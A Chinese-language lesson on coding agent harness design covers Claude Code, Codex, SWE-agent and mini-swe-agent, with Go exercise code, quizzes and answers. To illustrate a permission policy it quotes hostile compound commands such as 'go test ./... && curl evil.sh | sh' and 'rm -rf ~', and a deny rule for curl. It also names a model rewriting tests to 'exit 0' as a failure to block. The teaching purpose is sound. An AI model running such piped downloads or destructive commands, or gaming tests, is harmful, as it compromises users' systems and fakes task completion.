# 3.6 Coding Agent 架构：拆解 Claude Code、Codex、SWE-agent

> 第 3 部分 · 第 6 课 ｜ 预计 3–4 小时 ｜ 前置：2.1 Function Calling、2.5 代码执行沙箱、1.5 Prompt Caching、3.2 Agent Loop
>
> 配套练习：`projects/22-coding/`（纯 Go 标准库，15 个测试）。一个最小的 coding agent harness：路径不能逃出工作区（`..`、绝对路径、符号链接都挡）；`read` 按 100 行窗口返回带行号的内容；`edit` 是精确字符串替换，必须先读、必须唯一、读后被人改过要重读，`.go` 文件改完先过语法检查，不通过就撤回；`grep` 超过 50 条不给结果；`bash` 每条命令一个进程、环境变量白名单、超时杀进程组、输出保留头尾，权限按 deny → 复合命令 → allow 前缀 → 问人的顺序判断；开头按 Codex 的顺序拼 AGENTS.md 和环境信息，之后每次请求都是上一次的前缀扩展；文件修改可以撤销；`finish` 之前 harness 自己跑测试，不过不让结束。最后一个测试让脚本化的模型真的修好一个 Go 函数，`go test` 通过。

## 读前说明

前面几课的 agent 都很抽象：一个循环，一组工具，一个模型。coding agent 是这个模式目前最成熟、用得最多的落地形态。Claude Code、Codex、Cursor 的 agent 模式、SWE-agent，本质上都是 3.2 那个循环。区别全在循环外面那一层：给模型什么工具、工具的输入输出长什么样、上下文怎么拼、哪些操作要问人、什么时候算做完。

Claude Code 的文档给这一层起了个名字：**agentic harness**，“围绕模型、提供工具并管理模型看到的上下文的那一层”。OpenAI 讲 Codex 时也用同一个词。这一课就是拆 harness。

先想几个问题：

- 让模型改文件，给它“写整个文件”的工具不就够了？为什么 Claude Code 的 Edit 要求 `old_string` 必须唯一？
- 让模型看文件，一次给全文不是信息最多吗？SWE-agent 为什么只给 100 行？
- Codex 每次请求都把完整历史重新发一遍，为什么不用 `previous_response_id`？这样不是平方级的开销吗？
- mini-swe-agent 只有一个 bash 工具，连 function calling 都不用，在 SWE-bench Verified 上照样 74% 以上。那精心设计的工具还有意义吗？

---

## 1. 一个 coding agent 由什么组成

Claude Code 文档把循环描述成三个阶段：**收集上下文、采取行动、验证结果**，三者交织，反复进行。修一个失败的测试，典型过程是：

```text
跑测试看哪里失败 → 读错误输出 → 搜相关源文件 → 读这些文件
→ 编辑修复 → 再跑测试验证
```

每一步用一个工具，结果回到循环里决定下一步。把它拆开，harness 要负责的东西是：

| 组件 | 解决的问题 | 本课对应 |
|---|---|---|
| 文件工具 | 读、改、建文件，输入输出格式对模型友好 | 第 3.1、3.2 节 |
| 搜索 | 在大仓库里找到相关位置 | 第 3.2 节 |
| 执行 | 跑命令、跑测试，拿到真实反馈 | 第 3.3 节 |
| 权限与沙箱 | 哪些操作直接做，哪些要问，哪些禁止 | 第 3.4 节 |
| 上下文管理 | 项目说明、环境信息、历史、压缩、缓存 | 第 3.5 节 |
| 验证 | 什么时候算做完 | 第 3.6 节 |
| 会话与撤销 | 中断、恢复、分叉、回滚文件修改 | 第 2.1 节、3.5 课 |

---

## 2. 三个系统拆解

### 2.1 Claude Code

**工具**。内置工具分五类：文件操作、搜索、执行、Web、代码智能（编辑后看到类型错误，跳转定义、查引用，需要语言服务器插件）。另外还有一批编排类工具：`Agent`（开子代理，独立上下文窗口）、`AskUserQuestion`（多选题问用户）、计划模式、worktree 等。

几个值得注意的工具细节：

- **Edit 是精确字符串替换**，不用正则也不模糊匹配。三条检查：编辑前要在当前对话里读过这个文件（被截断的部分读取不算）；`old_string` 必须逐字符出现；必须只出现一次，否则要么带更多上下文，要么显式 `replace_all`。文件在上次读之后被改过时，只有 `old_string` 仍然精确且唯一匹配才放行，否则要求重读。
- **Read 返回带行号的内容**，单次最多约 25,000 token，超过 256 KB 的文件要分页读。
- **Bash 每条命令一个独立进程**。`cd` 会保留到后续命令（只要还在项目目录内），环境变量不保留。默认超时 2 分钟，上限 10 分钟。成功的输出大约 30,000 字符以内直接给模型，超过就存文件、只给前 2,000 字符预览；失败的输出大约 10,000 字符以内，超过给头尾摘录。
- **在 macOS、Linux 上，Glob 和 Grep 默认不在工具列表里**，模型直接在 Bash 里用 `find` 和 `grep`（底层是内嵌的 bfs 和 ugrep）。这是一个有意思的信号：专用搜索工具的价值在下降，模型已经很会用 shell 了。
- **Glob 结果最多 100 个文件**，超了给截断标记，让模型缩小范围。

**会话**。每条消息、工具调用和结果都写进 `~/.claude/projects/` 下的 JSONL 文件，这就是 3.5 课的事件日志。`--continue` / `--resume` 在同一个会话 ID 上追加，`--fork-session` 复制历史到新 ID。

**检查点**。编辑文件之前先给文件拍快照，按两次 Esc 回滚。检查点和 git 无关，只覆盖文件修改；数据库、API、部署这类远程操作撤不回，只能靠权限控制。

**权限模式**：Auto（后台分类器审查每个动作，拦下有风险的）、Manual（编辑和命令都问）、Accept edits（编辑和常见文件命令不问，其他命令问）、Plan（只探索和出方案，不改源文件）。`.claude/settings.json` 可以按 `Bash(npm run *)` 这种格式放行或禁止。

**上下文**。`CLAUDE.md` 存项目约定，仓库里有 `AGENTS.md` 也能读。自动记忆 `MEMORY.md` 每次会话开头加载前 200 行或 25 KB。上下文快满时自动压缩成摘要，早期的详细指令可能丢失，所以持久规则要写进 `CLAUDE.md`。Skills 只在会话开始时加载描述，用到才加载全文；MCP 工具定义默认延迟加载，只占名字的空间。子代理在自己的上下文窗口里跑，主对话只收到最终摘要。

### 2.2 Codex

OpenAI 在 2026 年 1 月的工程博客《Unrolling the Codex agent loop》里把 Codex CLI 的循环讲得很细。所有 Codex 产品（CLI、Cloud、VS Code 扩展）共用同一个 harness。

**请求结构**。Codex 用 Responses API，关注三个字段：

- `instructions`：模型专属的基础提示词，随 CLI 打包（每个模型一份 prompt 文件），也可以在 `~/.codex/config.toml` 里换；
- `tools`：Codex 自己的 `shell`、`update_plan`，Responses API 提供的 `web_search`，以及用户配置的 MCP 工具（名字形如 `mcp__weather__get-forecast`）；
- `input`：一个 item 列表。

`input` 在用户消息之前，Codex 按固定顺序插入几条：

1. 一条 `role=developer` 的权限说明：沙箱规则、什么时候要问用户、哪些目录可写。**这些规则只约束 Codex 自己的 shell 工具**，MCP 工具不受 Codex 沙箱管，要自己负责安全；
2. （可选）`config.toml` 里的 `developer_instructions`；
3. （可选）一条 `role=user` 的“用户指令”，汇总自多个来源，越具体的越靠后：`$CODEX_HOME` 下的 `AGENTS.md`；然后从 Git 项目根目录一路走到当前目录，每层取 `AGENTS.override.md` 或 `AGENTS.md`，总量默认上限 32 KiB；再加上已配置 skills 的元数据；
4. 一条 `role=user` 的 `<environment_context>`，写明当前目录和 shell。

然后才是用户消息。

**无状态**。每个工具调用的结果追加到 `input`，整个列表重新发一遍。博客自己承认这在发送的 JSON 总量上是平方级的。不用 `previous_response_id` 的原因是保持每个请求完全无状态，并支持零数据保留（ZDR）客户：服务端存状态和 ZDR 冲突。ZDR 客户也不会丢失推理内容，因为加密的 reasoning 可以在服务端解密（OpenAI 保存的是解密密钥，不是数据）。

**真正贵的是采样，不是网络**。所以优化目标是 prompt cache 命中率：缓存只对精确前缀生效，命中时采样成本是线性的。Codex 特意让每次请求的旧 input 是新 input 的**精确前缀**。会导致 cache miss 的操作：

- 对话中途改变可用工具；
- 换模型（模型专属指令变了）；
- 改沙箱配置、审批模式或当前目录。

Codex 的应对：配置中途变化时，**追加**一条新消息描述变化（新的 developer 权限消息、新的 environment_context），而不是修改开头那条。博客还提到一个真实的坑：早期接 MCP 时工具列举顺序不稳定，导致 cache miss。MCP 服务器发 `tools/list_changed` 通知时，长对话中途更新工具列表代价也很高。

**压缩**。token 超过阈值时压缩对话。早期是手动 `/compact`，让模型生成摘要当作新的 input；现在用 Responses API 的 `/responses/compact` 端点，返回一个更短的 item 列表，其中有一个 `type=compaction` 的 item，带不透明的 `encrypted_content`，保留模型对原对话的“潜在理解”。超过 `auto_compact_limit` 自动触发。

**App Server**。后续一篇博客讲了 harness 的其余部分：thread 的创建、恢复、分叉、归档和事件历史持久化（客户端断线重连后能渲染一致的时间线）；配置与认证；在沙箱里执行 shell 和文件工具，接入 MCP 和 skills，统一的策略模型。这些通过 App Server 协议暴露给各个客户端。

### 2.3 SWE-agent：Agent-Computer Interface

SWE-agent（NeurIPS 2024）提出了 **ACI**（Agent-Computer Interface）这个概念：就像人用的软件需要好的 UI，给模型用的工具也需要专门设计。它的核心论点是：**为语言模型定制的接口，比为人设计的接口（比如 Linux shell）效果更好**，而且不需要改模型权重。

它的 ACI 由四部分组成：

- **搜索与导航**：`find_file`、`search_file`、`search_dir`，返回汇总结果。每次搜索最多 50 条；超过就不给结果，提示模型写更具体的查询；
- **文件查看器**：`open` 打开文件，一次最多显示 100 行，`scroll_up` / `scroll_down` / `goto` 移动窗口；显示文件完整路径、总行数、窗口上下各省略了多少行，每行带行号；
- **文件编辑器**：`edit` 替换打开文件中的一个行范围。编辑时跑 linter，**语法不对的编辑直接丢弃**，让模型重来；编辑成功后显示更新后的文件内容；
- **上下文管理**：命令没有输出时明确告诉模型“命令成功运行，没有输出”；最近 5 条之前的观察都折叠成一行。

论文的消融实验（SWE-bench Lite，GPT-4 Turbo，完整配置 18.0%）很能说明问题：

| 改动 | 解决率 | 变化 |
|---|---|---|
| 完整 SWE-agent | 18.0% | — |
| 去掉编辑命令（只能用 shell 改文件） | 10.3% | −7.7 |
| 编辑命令不带 linter | 15.0% | −3.0 |
| 搜索改成逐条迭代返回 | 12.0% | −6.0 |
| 去掉搜索命令 | 15.7% | −2.3 |
| 查看器每次 30 行 | 14.3% | −3.7 |
| 查看器显示整个文件 | 12.7% | −5.3 |
| 保留完整历史（不折叠旧观察） | 15.0% | −3.0 |
| 去掉示范轨迹 | 16.3% | −1.7 |

两个反直觉的结论：**给全文件反而更差**，**保留完整历史反而更差**。信息不是越多越好，无关内容会稀释注意力、挤占上下文，过时的文件内容还会误导模型。这和 1.6 上下文工程讲的是一回事。

在完整的 SWE-bench 测试集上，SWE-agent + GPT-4 Turbo 解决了 12.47%，之前最好的非交互式检索增强方法是 3.8%。

### 2.4 mini-swe-agent：一年之后的反转

同一个团队后来做了 mini-swe-agent，口号是“100 行有用的 AI agent”。它的设计几乎是 SWE-agent 的反面：

- **除了 bash 没有任何工具**，连模型的 tool calling 接口都不用，模型在回复里写命令，harness 解析出来执行。所以能接任何模型；
- **历史完全线性**，每一步只是往消息列表里追加。轨迹就是发给模型的消息，调试和微调都方便；
- **每个动作用 `subprocess.run` 独立执行**，不维护持久的 shell 会话。换到沙箱里只需要把 `subprocess.run` 换成 `docker exec`。

它在 SWE-bench Verified 上超过 74%。团队的说法是：2024 年他们非常强调工具和专门接口，一年后，构建一个有用的 agent 已经不需要这些了。

这不是说 ACI 没用了，而是说**最优的 ACI 随模型能力变化**。2024 年的模型不太会用 `sed` 安全地改文件，所以需要专门的编辑器；现在的模型 shell 用得很好，专用工具的边际收益变小，而“少一层抽象”带来的稳定性、可移植性、可调试性收益变大。Claude Code 在 Linux 上默认去掉 Glob 和 Grep 也是同一个趋势。但是**编辑工具没有被去掉**：Claude Code 在去掉 Glob、Grep 的同时保留了 Edit。因为改文件出错的代价最高，精确替换带来的安全检查（先读、唯一、过期检测、撤销快照）用 shell 很难做到。

### 2.5 对照

| | Claude Code | Codex | SWE-agent | mini-swe-agent |
|---|---|---|---|---|
| 工具 | 五类内置 + 编排工具 + MCP + skills | shell、update_plan、web_search + MCP + skills | 搜索 / 查看器 / 编辑器 + shell | 只有 bash |
| 改文件 | Edit 精确替换（先读、唯一） | 博客列出的工具里没有单独的编辑工具，经 shell 完成 | 行范围替换 + linter | shell 命令 |
| 执行 | 每命令独立进程，cwd 保留 | 沙箱里的 shell | 持久 shell 会话 | `subprocess.run`，每命令独立 |
| 项目说明 | CLAUDE.md（可读 AGENTS.md）+ 自动记忆 | 分层 AGENTS.md，32 KiB | 无 | 无 |
| 安全 | 权限模式 + 规则 + 文件检查点 | 沙箱 + 审批策略（只管 shell） | 容器 | 换成 docker exec |
| 上下文 | 自动压缩、skills 按需、子代理隔离 | 精确前缀 + compaction 端点 | 最近 5 条观察全文 | 线性，不处理 |

---

## 3. Harness 的设计要点

### 3.1 编辑：为什么是精确替换

改文件有四种常见格式：

| 格式 | 问题 |
|---|---|
| 写整个文件 | 大文件输出 token 多、慢；模型容易在“抄”没改的部分时漏掉或改错几行 |
| 按行号替换（SWE-agent） | 行号在每次编辑后漂移，连续多处编辑时模型要自己算偏移；模型看到的行号可能已过时 |
| 统一 diff / 补丁 | 格式严格，模型生成的上下文行、行号经常对不上，需要宽松的应用逻辑 |
| 精确字符串替换（Claude Code） | `old_string` 不唯一时要带更多上下文 |

精确替换的好处是**用内容定位，不依赖行号**，而且天然带了几道安全检查：

- **先读后改**：模型不能凭记忆或猜测去改一个它没看过的文件；
- **精确匹配**：差一个空格都不行，模型必须真的知道文件现在长什么样；
- **唯一**：出现多次就拒绝，逼模型给出足够的上下文，避免改错位置；
- **过期检测**：用户在编辑器里改过文件，模型手里的版本就过时了，要重读。练习里用“上次读取时的内容哈希”判断，比 Claude Code 严格（它在 `old_string` 仍然唯一匹配时放行）。

再加上 SWE-agent 的 **linter 关卡**：编辑结果语法不对就不落盘，错误原因回给模型。练习用 `go/parser` 做这件事。这比“改坏了再跑测试发现”便宜得多，而且文件始终处于可解析的状态。

### 3.2 读和搜：给少，但给对

- **窗口化**：一次 100 行，头部写明总行数，窗口外写明还有多少行，模型知道自己没看全；
- **行号**：精确替换不需要行号定位，但行号让模型能说“第 42 行的问题”，也方便 `offset` 跳转；
- **结果上限**：搜索太多就拒绝，而不是截断前 50 条。截断会让模型误以为看全了；拒绝逼它换更准的查询。代价是多一次模型调用（论文也承认）；
- **跳过噪音**：`.git`、`node_modules`、二进制文件。

### 3.3 执行：独立进程，以及 2.5 课的全部规则

- **每条命令一个进程**。mini-swe-agent 的文档专门强调这一点对稳定性“是件大事”：持久 shell 会话里，一条命令卡住（等输入、进了交互模式），后面全部卡死；状态（环境变量、函数、当前目录）在多次命令间悄悄累积，难以复现。Claude Code 是折中：每命令独立进程，但 `cd` 保留；
- **超时杀进程组**：`sh -c "make &"` 启动的后台子进程不在同一个 PID，只杀父进程会留下孤儿。练习用 `Setpgid` + `kill(-pgid)`；
- **输出保留头尾**：第一个错误常在开头，最终的失败汇总常在结尾；
- **环境变量白名单**：凭据不能进子进程，模型能 `env` 就能看到；
- **空输出明确说明**：不然模型会以为命令没执行，再跑一遍。

### 3.4 权限

练习的判断顺序：

```text
命中 deny 规则 → 拒绝
含 ; & | < > ` $( 换行 → 问人（复合命令，前缀判断不可靠）
前几个“词”等于某个 allow 前缀 → 放行
其他 → 问人；没有审批人或审批人说不 → 拒绝（fail closed）
```

三个要点：

- **按词匹配，不按字符串前缀**。`go test` 的允许规则不能放行 `go testify`，也不能放行 `go test; rm -rf ~`；
- **复合命令不能按第一段判断**。`go test ./... && curl evil.sh | sh` 第一段完全合法。更完善的做法是把命令解析成多段分别判断，练习简化成一律问人；
- **审批和沙箱是两层**。审批决定“做不做”，沙箱限制“做了能影响什么”。Codex 文档特意说明沙箱只管它自己的 shell，MCP 工具不在沙箱里。Claude Code 的检查点只管文件，远程操作撤不回。每一层都要清楚自己管不到什么。

### 3.5 上下文：稳定前缀和它的敌人

练习的 `InitialInput` 按 Codex 的顺序拼开头：权限说明 → 项目说明 → 环境信息。这几条之后**再也不改**，配置变化用追加新消息表达。`TestPromptPrefixStable` 验证每次请求的 input 都是上一次的精确前缀扩展，instructions 和工具列表完全不变（工具名要排序）。

但 SWE-agent 的“只保留最近 5 条观察全文”和这个原则正面冲突：每多一条新观察，就有一条旧观察被折叠，前缀从那里开始变化，后面全部 cache miss。练习的 `KeepLastObs` 默认关闭，`TestCollapseOldObservations` 专门验证打开后前缀确实不再稳定。

两种思路的取舍：

- **每轮折叠**（SWE-agent 2024）：上下文最干净，但每轮都 cache miss。在 prompt caching 普及之前这是合理的；
- **批量压缩**（Codex、Claude Code）：平时只追加，命中缓存；超过阈值时一次性压缩，之后又从新的前缀开始追加。一次 cache miss 换来很多轮命中。

另外两个手段：

- **按需加载**：skills 只放描述，MCP 工具只放名字，用到才加载全文；
- **子代理隔离**：搜索、探索这类产生大量中间输出的任务交给子代理，主上下文只收到摘要（3.3 课的 agents as tools）。

项目说明分层的规则也值得记住：从根目录到当前目录，越深越靠后；同一层 `AGENTS.override.md` 替代 `AGENTS.md`；旁支目录不加载；总量有上限，超了停止追加并说明。练习的 `ProjectDocs` 实现了这些。

### 3.6 验证：“做完”由谁说了算

模型说“我修好了”不算数。Codex 的长任务博客把循环写成“计划、改代码、跑工具（测试/构建/lint）、观察结果、修复失败、更新文档、重复”，并强调 harness 要执行一个有纪律的 **“done when”** 流程。

两种做法：

- **提示词要求**：在 AGENTS.md 里写“改完必须跑测试”。模型大多数时候会照做，但不保证；
- **harness 强制**：练习的 `finish` 工具，harness 自己跑 `Verify` 命令，不过就把失败输出作为工具结果回给模型，循环继续。`TestAgentFixesBugAndVerifies` 里脚本模型第一步就想直接结束，被拦下来。

验证命令是 harness 的，不走权限判断，也不能被模型修改。否则模型可以把测试改成 `exit 0`。更严格的系统还会检查模型有没有改测试文件本身。

---

## 4. 练习代码导读

| 文件 | 内容 |
|---|---|
| `workspace.go` | `resolve` 防路径逃逸；`Read` 窗口化；`Edit` / `Write` 的先读、匹配、唯一、过期、lint 关卡；`Undo` 快照；`Grep` 结果上限 |
| `shell.go` | `Policy.Check` 权限判断；`Shell.Run` 独立进程、进程组超时、头尾截断、环境白名单、空输出提示 |
| `context.go` | `ProjectDocs` 分层 AGENTS.md；`InitialInput` 固定开头 |
| `agent.go` | `Turn` 循环；`ChangeSettings` 追加而非修改；`view` 可选折叠；`finish` 强制验证 |
| `coding_test.go` | 15 个测试 |

### 4.1 resolve：三种逃逸

```go
full := filepath.Join(w.Root, p) // Join 会 Clean，../ 在这里被折叠
if !within(w.Root, full) { ... }
// 文件可能还不存在，就检查最近一个存在的上级目录
for probe := full; ; probe = filepath.Dir(probe) {
	real, err := filepath.EvalSymlinks(probe)
	if err == nil {
		if !within(w.Root, real) { ... } // 符号链接指向外面
		break
	}
	...
}
```

只做字符串检查挡得住 `../`，挡不住仓库里一个指向 `/home/you/.ssh` 的符号链接。写新文件时文件本身不存在，`EvalSymlinks` 会失败，所以要往上找到第一个存在的目录再解析。`NewWorkspace` 里先把 Root 自身也解析一次（macOS 的 `/tmp` 就是符号链接），否则比较前缀会误判。

注意这仍然有 TOCTOU 窗口：检查完到真正打开之间，符号链接可能被替换。真正的隔离靠 2.5 课的沙箱，路径检查只是第一道防线。

### 4.2 write：快照和已读状态

```go
func (w *Workspace) write(full string, data []byte) error {
	old, err := os.ReadFile(full)
	w.undo = append(w.undo, snapshot{path: full, existed: err == nil, data: old})
	...
	w.read[full] = sha256.Sum256(data)
}
```

每次写之前拍快照，`Undo` 倒序恢复，原来不存在的文件就删掉。写完把“已读哈希”更新成新内容：agent 自己写进去的东西它当然知道，不需要再读；但外部修改会让哈希对不上。

### 4.3 finish

```go
case "finish":
	if a.Verify != "" {
		vout, verr := a.Sh.exec(ctx, a.Verify) // 不走 Run，不经过权限判断
		if verr != nil {
			return vout, false, fmt.Errorf("验证没通过（%s：%v），还不能结束", a.Verify, verr)
		}
	}
	return args.Summary, true, nil
```

---

## 5. 常见的坑

- **给模型“写整个文件”作为唯一的编辑方式**。大文件改一行要输出几千行，还经常顺手改坏别处。
- **搜索结果截断而不是拒绝**。模型以为看全了，基于不完整的信息下结论。
- **持久 shell 会话**。一条 `vim` 或 `git commit`（打开编辑器）就能让整个会话卡死。
- **只杀父进程**。后台子进程变成孤儿，占着端口，下一次 `go run` 起不来。
- **按字符串前缀放行命令**。`git` 前缀放行了 `git push --force`。
- **改开头的系统消息来反映配置变化**。每次改配置，整段历史 cache miss。
- **工具列表顺序不稳定**。map 遍历、MCP 服务器连接顺序，都会让前缀变化。
- **相信模型说“测试通过了”**。harness 自己跑一遍。
- **验证命令可被模型修改**。模型把 `Makefile` 的 test 目标改成 `true`。
- **以为检查点能撤销一切**。数据库迁移、`git push`、发出去的请求都撤不回。

---

## 6. 练习

### 练习 1：读懂并跑通（必做）

```bash
cd projects/22-coding && make test
```

回答：

1. `TestPathEscapes` 里 `link/new.txt` 这个文件并不存在，`resolve` 是怎么发现它在工作区外的？
2. `TestPolicy` 里 `go test ./... && curl x | sh` 是 Deny，`go test ./... && make install` 是 Ask。为什么两者结果不同？如果把 deny 检查挪到复合命令检查之后，会发生什么？
3. 把 `KeepLastObs` 设成 5，`TestPromptPrefixStable` 会不会失败？为什么？

### 练习 2：编辑后诊断（必做）

Claude Code 装了语言服务器插件后，每次编辑完会自动把类型错误和警告告诉模型。给练习加一个简化版：

- `Workspace` 增加 `Diagnose func(ctx, path string) string`；
- `Edit` / `Write` 成功后，如果设置了 `Diagnose`，把它的返回追加到结果里（“编辑已生效，但有以下问题：...”）。**不阻止编辑**，和 lint 关卡区分开：语法错误拒绝，类型错误只提示；
- 实现一个 `GoVet(dir)`：对被编辑文件所在的包跑 `go vet`（用 `Shell.exec`，超时 30 秒），没问题返回空字符串；
- 测试：把 `Add` 的返回值改成未定义的变量 `c`，语法通过、编辑生效，结果里出现 `undefined: c`；正常编辑结果里没有诊断信息。

### 练习 3：只读探索子代理（选做）

实现 `Explore(ctx, model, ws, question) (string, error)`：

- 子代理有自己的 `Agent` 实例和独立的 input，工具只有 `read`、`grep` 和只读 shell（策略只允许 `ls`、`cat`、`git log`、`git diff`，其他一律拒绝，不问人）；
- 子代理调用 `finish` 时，`summary` 就是返回给主 agent 的结果；
- 主 agent 增加一个 `explore` 工具，参数是问题，结果只有摘要；
- 测试：子代理读了 3 个文件、搜了 2 次，主 agent 的 input 只增加了一条工具调用和一条摘要结果；子代理尝试 `edit` 会得到“没有工具”错误。

---

## 7. 自测题

1. Claude Code 文档里的 “agentic harness” 指什么？它负责哪些事？
2. Claude Code 的 Edit 有哪三条检查？各自防的是什么错误？
3. SWE-agent 的消融里，“查看器显示整个文件”和“保留完整历史”都比默认配置差。为什么信息更多反而更差？
4. SWE-agent 的搜索超过 50 条时为什么不返回前 50 条，而是直接拒绝？代价是什么？
5. Codex 为什么不用 `previous_response_id`？这样做的开销怎么被抵消？
6. 列出三种会让 Codex 的 prompt cache 失效的操作。对话中途改了审批模式，Codex 怎么处理？
7. 每轮折叠旧观察和 prompt caching 为什么冲突？现在的 coding agent 怎么取舍？
8. mini-swe-agent 只有 bash 也能做到 74% 以上，这说明了什么？为什么 Claude Code 去掉了 Glob、Grep 却保留了 Edit？
9. 权限判断里，为什么复合命令不能按第一段的前缀放行？为什么要按词匹配？
10. “改完要跑测试”写在 AGENTS.md 里和由 harness 强制执行，有什么区别？强制执行时要注意什么？

## 8. 自测题答案

1. 围绕模型的那一层：提供工具、管理模型看到的上下文。具体包括工具的定义和执行、输入输出格式、项目说明和环境信息的拼装、历史与压缩、权限与沙箱、会话持久化与撤销、什么时候算完成。模型负责推理和决定，harness 负责其余一切。
2. 先读后改：防止模型凭记忆或猜测改一个没看过的文件；精确匹配：逼模型知道文件当前的真实内容，差一个空格都不行；唯一：防止改错位置，出现多次时要么带更多上下文，要么显式 `replace_all`。此外，文件读后被外部修改会触发重读，防止基于过时内容编辑。
3. 无关内容稀释注意力、占用上下文，挤掉了真正有用的信息和后续交互的空间；完整历史里还有过时的文件内容（文件已经改了，旧观察还是改之前的样子），会误导模型。窗口 + 行号 + 窗口外行数，让模型知道自己没看全，需要时再看。
4. 截断会让模型以为看到了全部结果，基于不完整信息做判断；拒绝并提示写更具体的查询，逼模型缩小范围。代价是多一次模型调用（重新生成查询）。
5. 为了让每个请求完全无状态，并支持零数据保留：服务端保存状态和 ZDR 冲突。代价是发送的 JSON 总量平方级增长，但网络开销远小于采样开销；Codex 让每次请求的旧 input 是新 input 的精确前缀，prompt cache 命中时采样成本是线性的。
6. 对话中途改变可用工具；换模型；改沙箱配置、审批模式或当前目录（还有工具列举顺序不稳定）。改审批模式时追加一条新的 developer 权限消息，不修改开头那条，前缀保持不变。
7. 缓存只对精确前缀生效。每轮折叠会把某条旧观察替换成一行摘要，前缀从那里开始变化，之后全部 miss。现在的做法是平时只追加（命中缓存），超过阈值时批量压缩一次（Codex 的 compaction 端点、Claude Code 的自动压缩），一次 miss 换很多轮命中。
8. 最优的 ACI 随模型能力变化。2024 年的模型需要专门的编辑器、查看器；现在的模型 shell 用得很好，专用工具边际收益下降，而更少的抽象带来稳定性、可移植性（任何模型、任何沙箱）、可调试性（轨迹即消息）。Claude Code 保留 Edit，因为改文件出错代价最高，精确替换附带的先读、唯一、过期检测、撤销快照这些检查用 shell 很难保证。
9. 复合命令里第一段合法不代表后面合法（`go test && curl evil | sh`），前缀判断只看到第一段，可以被轻易绕过。按词匹配避免 `go test` 放行 `go testify`、`git` 放行任何 git 子命令这类问题。练习里出现 `;`、`&`、`|`、重定向、`$(`、反引号、换行都转为问人。
10. 写在提示词里，模型大多会照做但不保证，可能跳过或误报“测试通过”。harness 强制执行时，验证不过就把失败输出回给模型、不允许结束。要注意验证命令本身属于 harness：不走权限判断、不能被模型修改（否则模型可以把测试改成恒真），更严格的还要检查模型是否改了测试文件。

---

## 9. 参考答案

### 练习 1

1. `filepath.Join(root, "link/new.txt")` 字符串上在工作区内，第一道检查通过。然后从完整路径开始 `EvalSymlinks`，文件不存在报 `ErrNotExist`，于是往上一级 `root/link` 再试；这个符号链接存在，解析结果是工作区外的目录，`within` 判断失败，返回 `ErrOutside`。
2. deny 检查在最前面，对整条命令做正则匹配，`curl` 出现在任何位置都会命中，所以是 Deny。第二条不含任何 deny 关键字，但含 `&&`，复合命令一律问人，所以是 Ask。如果先做复合命令检查，含 `&&` 的命令都会直接返回 Ask，`curl` 那条也会变成 Ask，危险命令就交给了人去判断，审批人一时疏忽就执行了。deny 必须最先。
3. 不会失败。那个测试每轮最多 3 条工具输出（两次 read 一次 bash 加一次 read），从没超过 5 条，所以没有发生折叠，前缀仍然稳定。折叠只在工具输出超过 K 条之后才开始改变旧消息，`TestCollapseOldObservations` 读了 8 次才观察到。

### 练习 2

```go
// Workspace 增加
Diagnose func(ctx context.Context, path string) string

// Edit / Write 成功写入之后：
msg := fmt.Sprintf("已修改 %s：替换 %d 处", p, n)
if w.Diagnose != nil {
	if d := w.Diagnose(ctx, p); d != "" {
		msg += "\n编辑已生效，但有以下问题：\n" + d
	}
}
return msg, nil
```

`Edit` / `Write` 需要多一个 `ctx` 参数，`Agent.call` 传进去。

```go
func GoVet(sh *Shell) func(ctx context.Context, path string) string {
	return func(ctx context.Context, path string) string {
		if filepath.Ext(path) != ".go" {
			return ""
		}
		pkg := "./" + filepath.ToSlash(filepath.Dir(path))
		s := *sh
		s.Timeout = 30 * time.Second
		out, err := s.exec(ctx, "go vet "+pkg)
		if err == nil {
			return ""
		}
		return strings.TrimSpace(out)
	}
}
```

要点：

- 只对被编辑文件所在的包跑，不跑 `./...`，大仓库里全量 vet 太慢；
- 诊断只提示不阻止。类型错误常常是多处编辑的中间状态（先改调用方，再改定义），每一步都拒绝会让模型无法分步完成重构；语法错误则意味着文件已经无法解析，所以由 lint 拒绝；
- 诊断输出也要截断（`exec` 已经做了）；
- 测试：`Edit("calc.go", "return a - b", "return c", false)` 成功，文件已改，结果包含 `undefined: c`；`Edit(..., "a - b", "a + b")` 结果里不含“问题”。

### 练习 3

```go
func Explore(ctx context.Context, m Model, ws *Workspace, q string) (string, error) {
	ro := Policy{Allow: []string{"ls", "cat", "git log", "git diff"}}
	sub := &Agent{
		Model: m, WS: ws, MaxSteps: 20,
		Sh:    &Shell{Dir: ws.Root, Policy: ro}, // Approve 为 nil：不在允许列表的一律拒绝
		tools: map[string]bool{"read": true, "grep": true, "bash": true, "finish": true},
	}
	if err := sub.Start(ws.Root, Settings{Approval: "never", Writable: "（只读）"}); err != nil {
		return "", err
	}
	return sub.Turn(ctx, "只读调查以下问题，完成后用 finish 给出简洁结论：\n"+q)
}
```

`Agent` 增加一个可选的 `tools` 集合：`toolNames()` 只返回集合里的名字，`call` 开头检查不在集合里就返回“没有工具”。主 agent 的 `call` 增加：

```go
case "explore":
	out, err = Explore(ctx, a.Model, a.WS, args.Question)
```

测试时主 agent 和子代理用两个不同的脚本模型（或者一个模型根据 `req.Input[0]` 的内容区分）。验证：主 agent 的 `Input()` 在 explore 前后只多了一条 assistant（含调用）和一条 tool（摘要）；子代理的请求记录里有 3 次 read 和 2 次 grep；子代理脚本里放一个 `edit` 调用，它的工具结果是“没有工具”。

注意子代理共享了同一个 `Workspace`，所以它的 `read` 也会更新已读状态，主 agent 之后可以直接编辑子代理读过的文件。如果不想这样（主 agent 自己没看过内容），给子代理一个新的 `Workspace` 实例指向同一个目录即可。

---

## 完成标准

- `make test` 全部通过（15 个测试），`go test -race` 通过；
- 练习 1 的三个问题能讲清楚，尤其是 deny 为什么必须最先检查；
- 练习 2 的编辑后诊断写完，能解释为什么语法错误拒绝、类型错误只提示；
- 能画出 Codex 一次请求的 input 结构，说出 AGENTS.md 的加载顺序和上限；
- 能复述 SWE-agent 消融里至少三个结论，并说明 mini-swe-agent 的反转意味着什么；
- 自测题 10 道能不看答案讲出来，尤其是第 2、5、7、8 题。
